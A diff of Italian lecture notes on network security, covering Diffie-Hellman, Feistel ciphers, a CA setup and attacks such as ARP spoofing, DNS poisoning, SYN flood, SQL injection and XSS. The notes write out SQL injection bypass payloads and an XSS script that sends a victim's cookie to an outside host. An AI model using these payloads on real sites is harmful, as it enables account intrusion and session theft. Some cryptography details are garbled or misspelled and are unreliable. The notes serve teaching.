@@ -434,83 +434,352 @@
 				\item ElGamal schema basato su logaritmi discreti
 				\item DSA schema a firma digitale basato su logaritmi discreti.
 			\end{itemize}
-		\subsubsection{Diffie Hellman}
-			Si basa sull'intrattabilità del logaritmo discreto.\\
-			Dato un numero primo p si definisce radice primitiva di p un numero $\alpha$ per cui vale:
-			$$\alpha modp \neq \alpha^{2} modp \neq \alpha^{3} modp \neq ... \neq \alpha^{i} modp  $$
-			$$i<p $$
-			Nello scambio entrambi A e B posseggono due parametri noti p,$\alpha$ ciascuno genera un numero casuale $X_{a}$ e $A_{b}$
-			\begin{enumerate}
-				\item A invia a B $Y_{a}= \alpha^{X_{a}} modp$
-				\item B riceve $Y_{a}$ ed invia ad A $Y_{b}=\alpha^{X_{b}}modp$
-				\item A calcola $K_{a} = Y_{b}^{X_{a}}modp = (\alpha^{X_{b}})X^{a}modp= \alpha^{X_{b}*X{a}}$
-				\item B calcola $K_{b} = Y_{a}^{X_{b}}modp = (\alpha^{X_{a}})X^{b}modp= \alpha^{X_{a}*X{b}}$
-				\item Risulta $K_{b} = K_{a}$ dunque A e B si sono scambiati una chiave segreta \textbf{senza avere nessuna credenziale comune}
- 			\end{enumerate}	
- 			\textbf{Un attaccante che vede passare solo $Y_{a}$ e $Y_{b}$ non è in grado di calcolare il logaritmo discreto quindi non può ricavare la chiave}\\
- 			Diffie Hellman non è sicuro contro attacchi \textbf{man in the middle}:
- 			\begin{itemize}
- 				\item D genera $X{d1}$ e $X{d2}$ e le chiavi pubbliche corrispondenti $Y{d1}$ $Y{d2}$
- 				\item A invia $Y{a}$ a B
- 				\item D intercetta il messaggio e trasmette invece $Y{d1}$ a B
- 				\item B riceve $Y{d1}$ e calcola $K_{b}= Y_{d1}^{X_{b}}modp$
- 				\item B invia $Y{b}$ ad A
- 				\item D intercetta $Y{b}$ e invia invece $Y{d2}$ ad A
- 				\item A calcola $K_{a}= Y_{d2}^{X_{a}}modp$
- 			\end{itemize}
+			\subsubsection{Diffie Hellman}
+				Si basa sull'intrattabilità del logaritmo discreto.\\
+				Dato un numero primo p si definisce radice primitiva di p un numero $\alpha$ per cui vale:
+				$$\alpha modp \neq \alpha^{2} modp \neq \alpha^{3} modp \neq ... \neq \alpha^{i} modp  $$
+				$$i<p $$
+				Nello scambio entrambi A e B posseggono due parametri noti p,$\alpha$ ciascuno genera un numero casuale $X_{a}$ e $A_{b}$
+				\begin{enumerate}
+					\item A invia a B $Y_{a}= \alpha^{X_{a}} modp$
+					\item B riceve $Y_{a}$ ed invia ad A $Y_{b}=\alpha^{X_{b}}modp$
+					\item A calcola $K_{a} = Y_{b}^{X_{a}}modp = (\alpha^{X_{b}})X^{a}modp= \alpha^{X_{b}*X{a}}$
+					\item B calcola $K_{b} = Y_{a}^{X_{b}}modp = (\alpha^{X_{a}})X^{b}modp= \alpha^{X_{a}*X{b}}$
+					\item Risulta $K_{b} = K_{a}$ dunque A e B si sono scambiati una chiave segreta \textbf{senza avere nessuna credenziale comune}
+ 				\end{enumerate}	
+ 				\textbf{Un attaccante che vede passare solo $Y_{a}$ e $Y_{b}$ non è in grado di calcolare il logaritmo discreto quindi non può ricavare la chiave}\\
+ 				Diffie Hellman non è sicuro contro attacchi \textbf{man in the middle}:
+ 				\begin{itemize}
+ 					\item D genera $X{d1}$ e $X{d2}$ e le chiavi pubbliche corrispondenti $Y{d1}$ $Y{d2}$
+ 					\item A invia $Y{a}$ a B
+ 					\item D intercetta il messaggio e trasmette invece $Y{d1}$ a B
+ 					\item B riceve $Y{d1}$ e calcola $K_{b}= Y_{d1}^{X_{b}}modp$
+ 					\item B invia $Y{b}$ ad A
+ 					\item D intercetta $Y{b}$ e invia invece $Y{d2}$ ad A
+ 					\item A calcola $K_{a}= Y_{d2}^{X_{a}}modp$
+ 				\end{itemize}
  			
- 			INSERIRE diffie\\
+ 				INSERIRE diffie\\
  			
- 		\subsubsection{Algoritmi a chiave simmetrica: One time pad}
- 			\begin{enumerate}
- 				\item Dato un testo in chiaro m di n bit si scegli una chiave k generata attraverso un generatore perfetto di numeri casuali
- 				\item La cifratura è $c=m\oplus k$
- 				\item ad ogni trasmissione si deve cambiare k
- 			\end{enumerate}
- 			Con questo algoritmo si scorrela completamente c da m, con il risultato che è \textbf{impossibile effettuare crittanalisi}. Di contro abbiamo che dobbiamo trasportare una chiave k su canale sicuro (della stessa lunghezza di n). In linea teorica questo algoritmo garantisce la \textbf{sicurezza più elevata}, ma nella pratica è \textbf{difficile da utilizzare}
+ 			\subsubsection{Algoritmi a chiave simmetrica: One time pad}
+ 				\begin{enumerate}
+ 					\item Dato un testo in chiaro m di n bit si scegli una chiave k generata attraverso un generatore perfetto di numeri casuali
+ 					\item La cifratura è $c=m\oplus k$
+	 				\item ad ogni trasmissione si deve cambiare k
+ 				\end{enumerate}
+ 				Con questo algoritmo si scorrela completamente c da m, con il risultato che è \textbf{impossibile effettuare crittanalisi}. Di contro abbiamo che dobbiamo trasportare una chiave k su canale sicuro (della stessa lunghezza di n). In linea teorica questo algoritmo garantisce la \textbf{sicurezza più elevata}, ma nella pratica è \textbf{difficile da utilizzare}
  			
- 		\subsubsection{Algoritmi a chiave simmetrica: Cifratura di Feitsel}
- 			La cifratura di Feitsel è un algoritmo di sostituzione ideale che mappa un messaggio in chiaro di 2 bit in un messaggio cifrato di 2 bit \textbf{utilizzando una mappa statica}.\\
+ 			\subsubsection{Algoritmi a chiave simmetrica: Cifratura di Feitsel}
+ 				La cifratura di Feitsel è un algoritmo di sostituzione ideale che mappa un messaggio in chiaro di 2 bit in un messaggio cifrato di 2 bit \textbf{utilizzando una mappa statica}.\\
  			
- 			INSERIRE static\\
+ 				INSERIRE static\\
  			
- 			Se il messaggio è lungo 2 bit e la mappa $2^{2}$ righe, \textbf{l'attaccante può tentare solo attacchi di forza bruta}, non esiste correlazione statica tra testo in chiaro e testo cifrato. Quando il messaggio è più lungo si cifrano blocchi di 2 bit per volta.\\
- 			Per risultare sicuro i blocchi devono essere di grandi dimensioni, ma in tal caso \textbf{la mappa diventa molto grande} ($n=64 \rightarrow$ $64x2^{64} = 2^{70} bit$). Procedimento:
- 			\begin{enumerate}
- 				\item Dalla chiave K si generano una serie di sottochiavi $K_{i}$ con una funzione generatrice
- 				\item Si eseguono una serie di fasi di cifratura che hanno come parametro $K_{i}$ e il risultato della fase precedente.
- 				\item Tutti gli algoritmi a blocchi come AES utilizzano questo schema di cifratura
- 			\end{enumerate}
+ 				Se il messaggio è lungo 2 bit e la mappa $2^{2}$ righe, \textbf{l'attaccante può tentare solo attacchi di forza bruta}, non esiste correlazione statica tra testo in chiaro e testo cifrato. Quando il messaggio è più lungo si cifrano blocchi di 2 bit per volta.\\
+ 				Per risultare sicuro i blocchi devono essere di grandi dimensioni, ma in tal caso \textbf{la mappa diventa molto grande} ($n=64 \rightarrow$ $64x2^{64} = 2^{70} bit$). Procedimento:
+ 				\begin{enumerate}
+ 					\item Dalla chiave K si generano una serie di sottochiavi $K_{i}$ con una funzione generatrice
+ 					\item Si eseguono una serie di fasi di cifratura che hanno come parametro $K_{i}$ e il risultato della fase precedente.
+ 					\item Tutti gli algoritmi a blocchi come AES utilizzano questo schema di cifratura
+ 				\end{enumerate}
 			
-			INSERIRE feit\\
+				INSERIRE feit\\
 			
-		\subsubsection{Altri algoritmi : DA FINIRE}
-	\subsection{Esempio: organizzazione rete certificati}
-		La rete è composta da:
-		\begin{itemize}
-			\item La vostra rete è composta da
-			\item Una rete di computer fissi per i vostri utenti
-			\item Un server per applicativi web necessari ai vostri utenti
-			\item Un server per la posta elettronica
-			\item Dei possibili utenti remoti, roadwarrior.
-		\end{itemize}
+			\subsubsection{Altri algoritmi : DA FINIRE}
+			
+		\subsection{Esempio: organizzazione rete certificati}
+			La rete è composta da:
+			\begin{itemize}
+				\item La vostra rete è composta da
+				\item Una rete di computer fissi per i vostri utenti
+				\item Un server per applicativi web necessari ai vostri utenti
+				\item Un server per la posta elettronica
+				\item Dei possibili utenti remoti, roadwarrior.
+			\end{itemize}
 	
-		INSERIRE rete\\
+			INSERIRE rete\\
 		
-		I \textbf{servizi} che la rete offre sono:
-		\begin{itemize}
-			\item non sia possibile collegarsi alla rete interna se non utilizzando i client fissi
-			della rete,
-			\item che ad ogni client della rete possa effetturare l’accesso solo personale
-			autorizzato
-			\item che i servizi del vostro webserver siano accessibili solo dai terminali della
-			rete
-			\item che la posta elettronica sia certificata
-			\item che gli utenti possano inviare e ricevere posta elettronica in modo sicuro
-			\item che tutto quello che può fare un utente dal proprio terminale interno lo
-			possa fare anche un utente roadwarrior
-		\end{itemize} 
-		
+			I \textbf{servizi} che la rete offre sono:
+			\begin{itemize}
+				\item non sia possibile collegarsi alla rete interna se non utilizzando i client fissi
+				della rete,
+				\item che ad ogni client della rete possa effetturare l’accesso solo personale
+				autorizzato
+				\item che i servizi del vostro webserver siano accessibili solo dai terminali della
+				rete
+				\item che la posta elettronica sia certificata
+				\item che gli utenti possano inviare e ricevere posta elettronica in modo sicuro
+				\item che tutto quello che può fare un utente dal proprio terminale interno lo
+				possa fare anche un utente roadwarrior
+			\end{itemize} 
+			Abbiamo bisogno di una \textbf{CA}, ovvero una macchina il più possibile isolata dalla rete, non accessibile
+			dall’esterno, non accessibile direttamente dagli utenti.
+			Su questa macchina generate un certificato master, protetto da password
+			che utilizzerete per generare tutti i certificati dei servizi. Possibilmente, in
+			un luogo fisicamente inaccessibile (cassaforte?) dovrete tenere un
+			backup del certificato.
+			Se la vostra rete è contenuta potete usare un programma come tinyca
+			per creare le chiavi degli utenti e dei servizi, che poi distribuite nei singoli
+			terminali, altrimenti avrete bisogno di un’interfaccia web accessibile dagli
+			utenti.
+			Le CRL della CA devono essere pubblicate in un luogo liberamente
+			accessibile a cadenza regolare.
+			
+	\section{Attacchi}
+		\subsection{Attacchi al mezzo fisico}
+			\begin{itemize}
+				\item Dos: interruzione di collegamento o jamming
+				\item attacchi di wiretapping 
+				\item sniffer hardware e sniffer in reti broadcast
+			\end{itemize}
+			\subsubsection{Jamming}
+				Il jamming \textbf{è l'atto di disturbare volutamente le comunicazioni radio (wireless)} facendo in modo che ne diminuisca il rapporto segnale/rumore, indice di chiarezza del segnale, tipicamente trasmettendo sulla stessa frequenza e con la stessa modulazione del segnale che si vuole disturbare. \\
+				Il jamming sul mezzo fisico si può fare solo in caso in cui il mezzo fisico lo permetta, come nel caso di reti wireless o reti wired con cavi non schermati. Anche se il jamming è difficile basta far fallire la ricezione di un bit per invalidare il checksum e far scartare un pacchetto.
+		\subsection{Attacchi a livello di collegamento}
+			\begin{itemize}
+				\item DoS: flood di pacchetti,generazione di collisioni
+				\item spoofing indirizzi MAC
+				\item ARP-Spoofing
+			\end{itemize}
+			\subsubsection{Dos al livello di collegamento}
+				Un attacco di flood può essere mirato alla saturazione della banda. Se il mezzo è condiviso si possono non rispettare i tempi di timeout e creare numerose collisioni, o in alternativa mantenere il canale sempre occupato. Si può mascherare il flood inviando pacchetti con indirizzo mittente modificato.
+			\subsubsection{ARP-Spoofing}
+				L'ARP è un protocollo di IPv4 utilizzato per mappare indirizzi IP a indirizzi MAC in una rete locale
+				Introduciamo in primo luogo il protocollo ARP (\textbf{Address Resolution Protocol}):
+				\begin{enumerate}
+					\item la macchina 192.168.2.51 vuole raggiungere l'indirizzo 192.168.2.52 nella stessa sottorete, per farlo deve inviare un frame all'indirizzo MAC corrispondente
+					\item \textbf{Se non conosce tale MAC} allora invia una richiesta ARP in broadcast chiedendo che la macchina 192.168.2.52 risponda notificando il suo MAC address
+					\item Tale macchian risponde con una ARP-reply specificando il suo indirizzo MAC
+				\end{enumerate}
+				
+				INSERIRE arp\\
+				
+				INSERIRE algoarp\\
+				
+				Lo scopo di un \textbf{attacco ARP-Spoofing} è intercettare il traffico che passa tra due macchine su una rete con switch. L'attaccante fa parte della rete ma non si trova nel path tra le due macchine vittime.	
+				\begin{enumerate}
+					\item Eve manda messaggi ARP-Reply diretti all'indirizzo MAC di Alice, dichiarando che l'IP di Bob corrispondente al suo indirizzo MAC.
+					\item Eve manda messagi ARP-Reply anche all'indirizzo MAC di Bob, dichiarando che l'IP di Alice corrisponde al suo indirizzo MAC
+					\item Il traffico TCP di Bob viene inviato ad Eve che può leggerlo, eventualmente modificarlo, e inviarlo ad Alice. Alice penserà che è stato Bob ad inviarli quel traffico TCP. 
+				\end{enumerate}
+		\subsection{Attacchi al livello di rete}
+			\begin{itemize}
+				\item DoS: flood di pacchetti, smurf
+				\item covert channels, fragmentation attacks, source routing
+				\item spoofing indirizzo IP
+			\end{itemize}
+			\subsubsection{Fragmentation attack}
+				Il protocollo IP permette di spezzare un pacchetto in più frammenti nel caso questo debba attraversare sottoreti che hanno MTU minore della lunghezza del pacchetto stesso. \\
+				
+				INSERIRE iphead\\
+				
+				In generale gli attacchi a frammentazione hanno lo scopo di superare i controlli fatti sugli header dai firewall stateless ( al giorno d'oggi i firewall sono tutti statefull).
+				
+				INSERIRE tcphead, frag, frag2\\
+				
+				I firewall normalmente sono configurati per bloccare i tentativi di connessione dall'esterno della rete verso porte maggiori di 1024 dei server. Per fare ciò scartano i pacchetti TCP con il flag SYN = 1 nell'header. Tuttavia \textbf{devono lasciare passare pacchetti che sono rivolti verso porte alte ma che fanno parte di una connessione aperta dall'interno della rete all'esterno}.\\
+				Un pacchetto IP è un wrapper di un pacchetto TCP, dunque la possibilità di frammentare in piccole parti un pacchetto IP introduce una vulnerabilità per l'header TCP che dunque può essere spezzato, permettendo di superare il controllo del flag SYN.\\
+				Un \textbf{Tiny fragmentation attack} sfrutta questa possibilità:
+				\begin{itemize}
+					\item Si spezza il pacchetto IP includendo nel primo frammento tutto l'header IP e una prima parte dell'header TCP (sequence number). Il secondo frammento inizia dal campo di ACK fino alla fine del payload.
+					\item Il primo frammento viene passato, anche se indirizzato a una porta maggiore di 1024, dal firewall poichè non contiene il flag TCP. Il secondo non viene interpretato come pacchetto TCP poichè non ha un header TCP ben formato e dunque viene anch'esso fatto passare.
+					\item Quando il pacchetto è riassemblato ha un header TCP valido con SYN = 1 diretto ad una porta maggiore di 1024 (\textbf{Ha già superato il firewall}).
+				\end{itemize}
+				Alcuni firewall aspettano di ricomporre il pacchetto prima di decidere se filtrarlo o meno, contravvenendo però allo standard vigente.\\
+				Un altro attacco che sfrutta questa vulnerabilità di IP è il \textbf{Overlapping fragments attack}: 
+				\begin{itemize}
+					\item Il primo frammento viene indirizzato ad una porta >1024 ma ha il campo SYN=0 dunque viene fatto passare.
+					\item Il secondo frammento non contiene un header TCP valido quindi non viene filtrato ma va a riscrivere una parte dell'header TCP: in particolare cambia il campo SYN =1.
+					\item i due pacchetti vengono ricomposti.
+				\end{itemize}
+			\subsubsection{Attacchi al DNS}
+				Il DNS (Domain Name System) risolve indirizzi alfanumerici in indirizzi IP. Per ogni dominio di rete esiste un server DNS che può fare tale traduzione in modo \textit{autoritative}. L'indirizzo del server DNS \textit{autoritative} non è noto per ogni dominio a priori, dunque ogni Host è configurato per interagire in primo luogo con un server DNS \textbf{locale}. Sarà dunque il DNS locale a contattare dei \textbf{root server} per ottenere gli indirizzi dei server DNS validi per tradurre l'indirizzo alfanumerico di un dato dominio. Una volta realizzata la traduzione (associazione) il DNS locale la tiene in \textbf{cache} per un certo periodo.\\
+				In generale un \textbf{attacco al DNS} serve a far credere che l'IP corrispondente ad un dato dominio, è un IP diverso da quello originale. Questa possibilità trova terreno fertile nel fatto che il protocollo DNS non utilizza cifratura per i suoi pacchetti, introducendo la possibilità di falsificarne le risposte. Un attacco di questo tipo può essere utilizzato per:
+				\begin{itemize}
+					\item Phishing
+					\item Furto di credenziali
+					\item attacchi su Home banking 
+					\item redirezione di connessione e MITM in generale
+				\end{itemize} 
+				Questi attacchi possono essere realizzati:
+				\begin{itemize}
+					\item Nella rete locale
+					\item Nella richiesta da/verso il server DNS locale
+					\item Nella richiesta da/verso DNS authoritative
+				\end{itemize}
+				\textbf{Al livello II} si possono fare attacchi MITM (arp-sppoofing per reti ethernet, attacchi su chiavi WEP per wifi). \textbf{Lo stesso principio può essere utilizzato} per:
+				\begin{itemize}
+					\item \textbf{DHCP}: assegnando ad un nodo della rete  un nuovo indirizzo del server DHCP controllato dall'attaccante
+					\item DNS responses: modificando i pacchetti che arrivano dal serve DNS. 				
+				\end{itemize} 
+				Per un attacco DNS responses \textbf{lo scopo dell'attaccante è quello di riuscire ad inquinare la cache del server DNS locale, ovvero di rispondere al posto del server DNS remoto}. Se l'attaccante si trova \textbf{nel path tra il server DNS e l'host } l'attacco è banale. Altrimenti l'attaccante deve rispondere prima del server DNS remoto. \\
+				Prima di vedere i dettagli sul funzionamento di questo tipo di attacco (\textbf{al livello III}) ricordiamo quali sono i campi "interessanti" di un pacchetto DNS:
+				\begin{itemize}
+					\item La porta UDP di origine e destinazione
+					\item l'IP  di origine e destinazione
+					\item L'ID del pacchetto, ovvero un numero scelto a caso da chi invia la richiesta che deve essere replicato nella risposta.	
+				\end{itemize}
+				Per realizzare l'attacco, l'attaccante deve rispondere con un \textbf{pacchetto DNS forgiato} con le caratteristiche giuste:
+				\begin{enumerate}
+					\item L'indirizzo IP sorgente che è quello del server remoto (\textbf{prevedibile})
+					\item La porta UDP sorgente del server remoto (53)
+					\item L'indirizzo IP di destinazione (\textbf{prevedibile})
+					\item La porta UDP di destinazione ovvero quella usata dal server DNS locale per inviare la richiesta 16 bit(\textbf{non prevedibile?})
+					\item L'ID del pacchetto di richiesta 16 bit(\textbf{non prevedibile!})
+				\end{enumerate}
+				Abbiamo dunque due campi di 16 bit che potrebbero essere imprevedibili per un attaccante. Le possibilità sono dunque:
+				$$32bit \rightarrow 2^{32} possibilità$$
+				L'attaccante ammesso che sappia il momento esatto per rispondere, deve inviare prima del server remoto mediamente 2 miliardi di pacchetti. Se ogni pacchetto è pesante 80 byte l'attaccante deve mandare 160GB di traffico prima che il server remoto possa rispondere.	\\
+				Tuttavia \textbf{alcuni server DNS non utilizzano una porta casuale per inviare le richieste} ma fa un BIND all'avvio per scegliere la porta e continua ad usarla. Conoscendo tale porta abbiamo comunque $6500*80 = 5MB$ da inviare in poche decine di millisecondi.\\
+				Possiamo provare a \textbf{restringere le ipotesi}: 
+				\begin{itemize}
+					\item Immaginiamo che E possa far iniziare la richiesta al server locale di A (stando dentro la rete oppure nel caso in cui il DNS locale di A accetti richieste dall'esterno).
+					\item In questo modo l'attaccante sa quando avverrà la richiesta e quindi anche la finestra utile per rispondere al posto del DNS authoritative.
+					\begin{enumerate}
+						\item Eve invia ad Alice una richiesta per il dominio www.example.com
+						\item Alice invia la richiesta al server DNS di www.example.com (B)
+						\item Eve prova a rispondere prima di B con un flood di n risposte fasulle
+					\end{enumerate}
+				\end{itemize}
+				In questo modo ha probabilità $n/2^{16}$ di riuscire, ammesso che il server DNS riesca ad elaborare tutte le richieste forgiate.\\
+				
+				INSERIRE PARADOSSO BIRTHDAY\\
+				
+				\textbf{In conclusione} possiamo dire che:
+				\begin{itemize}
+					\item Fare il poisoning di un server DNS è possibile ma \textbf{molto difficile}
+					\item Sotto opportune ipotesi l'attacco è realizzabile con mezzi a disposizione di chiunque.
+					\item L'attacco è più facile se il server authoritative (B) è sotto attacco DoS e dunque non risponde prontamente.
+					\item Per evitare che l'attacco sia applicabile è importante scegliere bene gli applicativi che si usano, avendo la certezza, ad esempio, che utilizzino porte casuali.
+				\end{itemize}
+		\subsection{Attacchi al livello di trasporto o superiori}
+			\begin{itemize}
+				\item\textbf{ Attacchi a livello di trasporto}:
+				\begin{itemize}
+					\item DoS: Syn flood, TCP reset guess
+					\item SYN spoofing
+				\end{itemize}
+				\item \textbf{Attacchi al \textit{middleware}}
+				\begin{itemize}
+					\item cross site splitting
+					\item SQL injection, problemi di programmazione di perl,php,python
+				\end{itemize}
+				\item \textbf{attacchi ai protocolli superiori}
+				\begin{itemize}
+					\item problemi di sicurezza di tutti i protocolli che non utilizzano crittografia (HTTP, TELNET, POP3)
+					\item DNS spoofing
+				\end{itemize}
+			\end{itemize}	
+			\subsubsection{Attacchi livello IV: Syn flood}
+				Si basa sul funzionamento del \textbf{three way handshake}: ogni qualvolta un server riceve un pacchetto con SYN=1 alloca delle risorse di memoria per gestire la connessione che sta per essere creata, quindi fa partire un pacchetto di risposta con SYN=1 e ACK=1 e aspetta per un timeout la risposta dal client e aprire la connessione. \textbf{In quel momento il server ha una connessione half open}. L'attaccante invia un gran numero di pacchetti con SYN=1 da indirizzi IP falsi, prima o poi \textbf{la memoria del server si saturerà e il server comincerà a scartare i pacchetti} (DoS). In questo modo si impedisce ad altre macchine di accedere al servizio.\\
+				Un possibile rimedio ad un attacco di questo tipo è l'utilizzo dei \textbf{Syn cookies}:
+				\begin{itemize}
+					\item quando si invia un pacchetto SYN=1 e ACK=1 (risposta del server al primo syn di richiesta) non si sceglie un numero casuale ma un numero che è una codifica di informazioni riguardanti la connessione. \textbf{In questo modo non viene allocata nessuna memoria.}
+					\item Una volta ricevuto il terzo messaggio, esso contiene l'ACK inviato da cui si riestraggono le informazioni codificate. Si apre dunque la connessione
+					\item Il numero di sequenza deve essere comunque \textbf{impredicibile}, altrimenti si rischiano attacchi di \textbf{syn spoofing}. Abbiamo bisogno di uno stato interno (un contatore) dello stack 
+				\end{itemize}
+			\subsubsection{Attacchi livello IV: TCP reset Guess}
+				Questo attacco si basa sulla possibilità di poter interrompere una connessione TCP inviando un pacchetto con campo RST=1. Poichè un pacchetto del genere venga accettato il pacchetto deve contenere i valori corretti di:
+				\begin{itemize}
+					\item Indirizzo IP del mittente
+					\item Porta TCP mittente e destinazione
+					\item Numero di sequenza corretto all'interno del flusso
+				\end{itemize}
+				Un attaccante che volesse interrompere una connessione TCP dovrebbe conoscere gli indirizzi IP, può indovinare le porte (una è nota l'altra è predicibile), \textbf{tuttavia non può conoscere il numero di sequenza corretto: deve provare \textit{brute force}.}\\
+				Il numero di sequenza è un \textbf{campo a 32 bit} quindi $2^{32}$ numeri da tentare (con un modem a 32k ci vogliono 284 giorni). Tuttavia il protocollo TCP impone che per essere ricevuto un pacchetto di reset debba \textbf{semplicemente cascare nella finestra di numeri di sequenza che la macchina mantiene attivi}. La finestra può essere larga fino a $2^{16} bit$. Non abbiamo bisogno di tentare tutti i numeri di sequenza ma ci basta provare numeri di sequenza non più distanti di $2^{16}$.
+				$$2^{32}/2^{16} = 2^{16} = 65,535 cifre \rightarrow 6 minuti$$
+				
+				INSERIRE tempi\\
+				
+		\subsection{Attacchi al middleware}
+			Per \textit{middleware} si intende tutto quel codice che sta nel mezzo tra la richiesta che fa un browser e la presentazione di una pagina HTML di risposta. CGI scritti in qualsiasi linguaggio, script PHP, Python, Ruby, sono tutti esempi di middleware.\\
+			La maggior parte degli \textbf{attacchi} hanno a che vedere con la \textbf{data validation}, ovvero tutte quelle tecniche che un programmatore dovrebbe utilizzare per evitare che un utente possa inserire nelle chiamate HTTP dati estranei a quelli desiderati. 
+			\subsubsection{SQL Injection}
+				Applicabile nel contesto di script PHP ecc viene utilizzato per eseguire query su database. \\
+				
+				INSERIRE sqltable \\
+				
+				\begin{itemize}
+					\item SELECT secret FROM userdb WHERE user =’$user’ AND password =’$password’\\
+					Se $user=Alice e $password=123 la query diventa:\\
+					SELECT secret FROM userdb WHERE user=’Alice’ AND password =’123’
+					\item Se si utilizzano
+					user=Alice
+					password=’\\
+					la query diventa:\\
+					SELECT secret FROM userdb WHERE user =’Alice’ AND password =”’\\
+					MySQL trova un ' di troppo e segnala un errore perrchè non riesce ad interpretare il resto della stringa. \textbf{questo errore può essere sfruttato}.
+					\item Se si utilizzano
+					user=Alice
+					password=’ OR user=’Alice\\
+					la query diventa:\\ SELECT secret FROM userdb WHERE user =’Alice’
+					AND password =” OR user=’Alice’\\
+					La stringa è corretta e significa: \textbf{restituisci dalla tabella la colonna per cui
+					(user=Alice e password=”) oppure user=Alice.\\
+					Il risultato è che la prima parte della query fallisce ma la seconda parte
+					restituisce il contenuto della colonna secret senza controllare la password}
+				\end{itemize}
+				Nell'esempio precedente era necessario conoscere la composizione di tutta la query, \textbf{che non è sempre nota}:
+				\begin{itemize}
+					\item utilizzando il commento - è possbile escludere delle parti della query di cui non si conosce il contenuto\\
+					user=Alice';-\\
+					la query diventa:\\
+					select secret from userdb where user =’Alice’; – and password =”
+					\item tutta la parte dopo - non viene considerata.
+				\end{itemize}
+				Se ci sono altre tabelle nel DB possiamo utilizzare query piu complicate per accedere anche a queste. Sapendo l'esistenza di una tabella come questa:\\
+				
+				INSERIRE table\\
+				
+				\begin{itemize}
+					\item utilizzando il comando UNION si possono fare query su tabelle diverse:\\
+					user=’ union select value from houses where owner=Alice; – \\
+					la query diventa:\\
+					select secret from userdb where user =” union select value from houses
+					where owner=Alice; –
+					\item \textbf{la prima parte della query fallisce ma la seconda va a fare una richiesta su una seconda tabella, che restituisce informazioni}
+				\end{itemize}
+				
+				Come posso sapere che \textbf{ci sono altre tabelle?}. Facendo le query giuste:\\
+				
+				INSERIRE query\\
+				
+				\textbf{Come possiamo impedire attacchi di SQL injection?} Le versioni più vecchie dei webserver non fanno nessun parsing sulle stringhe che si inseriscono nelle query. Oggi possiamo inserire controlli:
+				\begin{itemize}
+					\item lista caratteri vulnerabili
+					\item Utilizzare query già preparate
+				\end{itemize}
+			
+				INSERIRE vulnerable, prepared\\
+				
+			\subsubsection{Cross-site-scripting (XSS) stored }
+				Un attacco XSS è basato sulla possibilità di \textbf{inserire del codice malizioso all'interno di pagine web esterne}, in modo tale che gli utenti che si collegano a tali pagine sono indotti ad eseguirlo.
+				L'attacco può essere:
+				\begin{itemize}
+					\item \textbf{stored }: il codice persiste nella pagina web
+					\item \textbf{reflected}: il codice viene visualizzato in una messaggio temporaneo di errore
+				\end{itemize}	
+				La conseguenza è che l'utente si collega ad una pagina web di cui si fida ma riceve del codice malevole che viene eseguito \textbf{in locale sul suo browser}. L'attaccante cercherà di inserire codice eseguibile all'interno del codice HTML.\\
+				Ricordiamo il funzionamento dei cookies:
+				\begin{itemize}
+					\item HTML è \textit{stateless} ovvero non si conservano informazioni relative ad una connessione, ognuna di queste è scorrelata dalla precedente.
+					\item Per evitare di reinserire utente e pass ad ogni connessione si utilizzano i cookies.
+					\item è un'informazione che il server invia al browser dopo la prima connessione e che il browser reinvia al server ad ogni azione
+					\item In questo modo il server riconosce il browser e gli permette di saltare le autenticazioni per il tempo di validità dei cookies.
+				\end{itemize}
+				\textbf{Senza efficace validazione degli input} un attaccante può inserire degli script in javascript all'interno di uno script di echo (scritto per esempio in php) per \textbf{inviare il cookie dell'utente invece che al sito di destinazione ad un sito dell'attaccante}.\\
+				<script>window.open(’http://google.it?
+				cookie=’+document.cookie)</script>\\
+				Una possibile \textbf{applicazione} potrebbe riguardare siti nei quali è possibile inserire commenti, se la validazione degli input non è fatta in modo oculato un attaccante può aggiungere codice javascript alla pagina.  \textbf{Tutte le persone che successivamente caricheranno quella pagina eseguiranno il codice lasciato nel commento.} Se il sito gestisce dei cookie è questi ultimi sono \textbf{reindirizzati verso l'attaccante, che li può utilizzare per accedere ai servizi con l'identità di un utente del sito di partenza}.
+			\subsubsection{Cross-site-scripting (XSS) reflected: AJAX}
+				Si posso fare attacchi simili sfruttando:
+				\begin{itemize}
+					\item Link HTML all'interno delle mail
+					\item errori prodotti da web server mal configurati (404)
+				\end{itemize}	
+				
+				
+								
+			
 				
 			
 			 
